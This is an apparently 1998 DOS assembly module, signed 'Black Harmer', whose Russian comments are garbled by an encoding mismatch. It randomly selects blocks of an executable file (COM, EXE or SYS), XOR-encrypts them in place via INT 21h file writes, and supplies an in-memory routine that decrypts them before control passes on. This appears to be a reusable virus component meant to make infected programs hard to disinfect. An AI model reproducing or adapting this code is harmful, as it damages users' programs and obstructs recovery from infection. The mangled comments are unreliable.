;����p��p���� ����p���� ������ �� 䠩�� (c)'98 Black Harmer
;�ᯮ������ ����� �:
;random.asm - ����p��p���� ��p�������� ��砩��� �ᥫ
;�室: BX - ����⥫� 䠩�� (�⥭��/������)
;      AX - ��p孨� �p���� ����p���� (��� COM 䠩�� ��⠢���
;           �� ��p� ��� �� 3 ���� ��� JMP �� ��p��)
;      DX - ������ �p���� ����p����  (��� COM 䠩�� �� 㪠��⥫� �� �����)
;      LSEEK - �����⥫� 䠩�� ������ ����� �� �窥 �����.
;      ��� COM 䠩�� �� 0, � ��� EXE �� ��砫� �p��p���� ���
;      ���������, ��� ������� ��� �㤥� p������.
;      ������ ���� ��p������� ����p��p���� call_int_21, ��� �� ��� ⠪���
;      ᮤ�p�����:
;      call_int_21 proc near
;      int   21h
;      retn
;      call_int_21 endp
;�������������������������������������������������������������Ŀ
;����쪮 ������ ����p��뢠�� �� 䠩��                        ;�
number_of_blok_to_crypt_in_file=5                             ;�
;������ ������� �����                                         ;�
lengh_of_blok=5                                               ;�
;���������������������������������������������������������������
encrypt_blok proc near
        pusha
        push     es ds
        push     bx
        push     cs cs
        pop      ds es
        call     init_encrypt_blok
init_encrypt_blok:
        pop      bp
        sub      bp,offset(init_encrypt_blok-encrypt_blok)
        mov      bx,ax
        xor      cx,cx
        lea      di,[bp+data_for_uncrypt-encrypt_blok]
        sub      dx,lengh_of_blok
        push     dx
next_random_number_with_popdx:
        pop      dx
next_random_number:
        push     dx
        call     random_dx
        cmp      dx,bx
        jbe      next_random_number_with_popdx
        jcxz     check_cross_noneed
        lea      si,[bp+data_for_uncrypt-encrypt_blok]
        push     cx
next_check_cross:
        lodsw    ;DS:[SI] -> AX,SI+2
        sub      ax,dx
        cmp      ax,lengh_of_blok
        jb       check_cross_failed
        cmp      ax,(0ffffh-lengh_of_blok)
        ja       check_cross_failed
        loop     next_check_cross
        pop      cx
        jmp      check_cross_noneed
check_cross_failed:
        pop      cx dx
        jmp      next_random_number
check_cross_noneed:
        xchg     ax,dx
        stosw    ;AX -> ES:[DI],DI+2
        pop      dx
        inc      cx
        cmp      cx,number_of_blok_to_crypt_in_file*2
        jbe      next_random_number
        ;�p���㯠�� � �p����� ����p����
        pop      bx ;����⥫� 䠩��
        ;���� p���� �窠 ����� ?
        xor      cx,cx
        xor      dx,dx
        mov      ax,4201h
        call     call_int_21
        ;H� ��室� DX:AX
        lea      si,[bp+data_for_uncrypt-encrypt_blok]
        mov      cx,number_of_blok_to_crypt_in_file
next_encrypt_blok:
        push     cx dx ax
        ;��⠭�������� 㪠��⥫� �� ������ �����
        xor      cx,cx
        mov      dx,[si]
        mov      ax,4201h
        call     call_int_21
        push     dx ax
        ;��⠥� ����
        mov      cx,lengh_of_blok
        lea      dx,[bp+encrypt_blok_buffer-encrypt_blok]
        mov      ah,3fh
        call     call_int_21
        ;���p㥬 ����
        mov      cx,ax
        lea      di,[bp+encrypt_blok_buffer-encrypt_blok]
        mov      ax,[si+2]
        call     crypt_encrypt_one_blok
        ;��⠭�������� 㪠��⥫� �� ������ �����
        pop      dx cx
        mov      ax,4200h
        call     call_int_21
        mov      cx,lengh_of_blok
        lea      dx,[bp+encrypt_blok_buffer-encrypt_blok]
        mov      ah,40h
        call     call_int_21
        add      si,4
        pop      dx cx
        ;�⠢�� 㪠��⥫� �� ��� �����
        mov      ax,4200h
        call     call_int_21
        pop      cx
        loop     next_encrypt_blok
        pop      ds es
        popa
        retn
encrypt_blok endp
;����������������������������������������������������������������������������
;����p��p���� p����p���� ������ �� �p��p����, ��p�� ⥬ ��� ��p����� ��
;�p�������.
;�室:  ES:0000  -  �⭮�⥫쭠� �窠 p����p����
;       ��� COM 䠩�� PSP+10h:0000
;       ��� EXE 䠩�� PSP+10h:0000
;       ��� SYS 䠩�� CS:0000 (��p������ SYS 䠩� �� > 64k)
decrypt_blok proc near
        pusha
        push     ds
        call     initial_decrypt_blok
initial_decrypt_blok:
        pop      bp
        sub      bp,offset(initial_decrypt_blok-decrypt_blok)
        push     cs
        pop      ds
        lea      si,[bp+data_for_uncrypt-decrypt_blok]
        mov      cx,number_of_blok_to_crypt_in_file
next_decrypt_blok:
        push     cx
        mov      cx,lengh_of_blok
        mov      di,[si]
        mov      ax,[si+2]
        call     crypt_encrypt_one_blok
        add      si,4
        pop      cx
        loop     next_decrypt_blok
        pop      ds
        popa
        retn
decrypt_blok endp
;����������������������������������������������������������������������������
; ����p����/p����p���� ������
; �室: ES:DI - ���� ���p� ����室��� ����p�����/p����p�����
;       AX - ᫮�� p����p���� (����)
;       CX - ᪮�쪮 ���� ����p�����/p����p�����
crypt_encrypt_one_blok proc near
        pusha
next_encrypt_byte:
        xor      es:[di],al
        add      al,ah
        inc      di
        loop     next_encrypt_byte
        popa
        retn
crypt_encrypt_one_blok endp
;����������������������������������������������������������������������������
;�������������������������������������������������������������Ŀ
;�㤥� �ᯮ�짮������ �p�楤�p�� descrypt_blok ��� p����p����;�
;1. ���饭�� 2. �����, ���p� ����p����� (���� �����)       ;�
data_for_uncrypt    dd number_of_blok_to_crypt_in_file dup (0);�
;�p������� ����p ��� �⥭��/�����                           ;�
encrypt_blok_buffer db lengh_of_blok dup (0)                  ;�
;���������������������������������������������������������������
